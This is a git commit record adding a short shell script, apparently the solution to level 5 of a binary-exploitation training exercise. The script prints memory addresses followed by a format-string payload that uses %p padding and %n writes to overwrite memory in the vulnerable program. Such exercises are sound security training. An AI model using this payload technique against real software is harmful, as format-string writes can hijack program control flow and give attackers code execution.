b98660e49ef4d4a4c0e7eab5b4a2a44737e76797
miniske <miniske@Debian-Seb-PC.Debian-Seb-PC>
2019-05-14 10:44:34 +0200

    completed level05

---
+++ level05/ressources/script.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+
+echo -ne '\xe0\x97\x04\x08'
+echo -ne '\xe0\x97\x04\x08'
+echo -ne '\xe2\x97\x04\x08'
+echo -ne '\xe2\x97\x04\x08'
+
+echo -ne '%p %p %p %p %p %p %p %p %30926p %n %n  %34511p%n'
+#python -c "import sys; sys.stdout.write(\"\xff\" * $TIMES)"
+echo ''
